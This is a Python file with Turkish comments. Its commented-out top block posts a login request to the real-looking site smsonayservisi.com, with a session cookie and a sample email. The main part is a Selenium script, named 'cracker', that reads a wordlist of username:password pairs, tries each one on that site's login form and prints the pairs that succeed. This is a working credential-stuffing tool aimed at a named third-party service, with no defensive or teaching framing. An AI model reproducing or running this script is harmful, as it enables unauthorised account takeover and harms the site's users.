"""import  requests

url = "https://smsonayservisi.com/login"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Accept": "*/*",
    "Accept-Language":" tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
   " Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Length": "32",
    "Origin": "https://smsonayservisi.com",
    "Connection": "keep-alive",
    "Referer": "https://smsonayservisi.com/login",
   " Cookie": "ci_session=999fa816528e3ea7d9de0d33c8dc50f5dd931199",
    "Sec-Fetch-Dest": "empty",
   " Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority":" u=0",
    "TE": "trailers",
}

data = {
    "email":"ataberk@gmail.com",
    "password":"fhd"
}

response = requests.post(url=url , headers=headers, data= data)

print(response.status_code)
print(response.text)"""
from lib2to3.pgen2.grammar import opmap_raw

"""word = input("W yttou:")

with open(word , "r") as fi:
    oku = fi.readlines()
    for i in oku:
        print(i)"""


from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def main():
    wordlist = input("Wordlist Yolunu Girin: ")
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")

    driver = webdriver.Chrome(options=options)
    driver.get("https://smsonayservisi.com/")
    time.sleep(3)

    # Giriş Yap Butonuna Tıkla
    login_button = driver.find_element(By.XPATH, "//a[contains(text(),'Giriş Yap')]")
    login_button.click()

    def cracker():
        username_input = driver.find_element(By.XPATH, "//form[@action='/ajax/login']//input[@id='loginEmail']")
        password_input = driver.find_element(By.XPATH, "//input[@placeholder='Şifre']")

        try:
            with open(wordlist, "r") as file:
                oku = file.readlines()

                for urls in oku:
                    parcala = urls.strip().split(":")
                    if len(parcala) != 2:
                        print(f"Hatalı Format: {urls.strip()}")
                        continue

                    username, passwords = parcala
                    username_input.send_keys(username)
                    password_input.send_keys(passwords)

                    try:
                        # Giriş yap butonuna tıkla
                        sumbit_button = WebDriverWait(driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Giriş Yap')]"))
                        )
                        sumbit_button.click()

                        # Hata mesajı çıkarsa kapat
                        try:
                            error_button = WebDriverWait(driver, 7).until(
                                EC.element_to_be_clickable((By.XPATH, "//button[normalize-space()='OK']"))
                            )
                            error_button.click()
                            print(f"Başarısız giriş: {username}:{passwords}")
                        except Exception:
                            print(f"Başarılı giriş: {username}:{passwords}")
                            break  # Başarılı giriş sonrası döngüyü kır

                    except Exception as e:
                        print(f"Hata oluştu: {e}")

                    # Input alanlarını temizle
                    username_input.clear()
                    password_input.clear()

        except FileNotFoundError:
            print("Belirtilen Dosya Yolu Bulunamadı.")
        except Exception as e:
            print(f"Bilinmeyen Hata: {e}")
        finally:
            driver.quit()

    cracker()

if __name__ == "__main__":
    main()
